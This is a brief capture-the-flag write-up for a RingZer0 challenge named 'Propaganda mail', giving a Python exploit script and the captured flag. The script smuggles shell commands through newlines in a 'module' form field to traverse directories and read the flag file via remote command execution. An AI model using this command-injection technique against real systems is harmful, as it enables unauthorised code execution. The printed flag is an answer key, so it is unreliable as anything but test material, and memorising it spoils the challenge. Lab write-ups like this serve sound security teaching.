<h1>Propaganda mail</h1>
<h3>Description</h3>
<label>http://challenges.ringzer0ctf.com:10185</label>
<h3>Solution</h3>
<label>RCE shell_exec</label>

```python3
import requests

url = 'http://challenges.ringzer0ctf.com:10185/'
data = {
        'module':'mail_propaganda.py\ncd ..\ncd ..\ncd ..\ncd ..\ncat flag_weak_filter_or_regex.txt',
        'target':'marozi.eno@gmail.com',
    }

res = requests.post(url,data=data).text
print(res)
```
<h3>Flag</h3>
<pre>
FLAG-7nBkQ202VW426m583bq9zG6W12w2b93w
</pre>
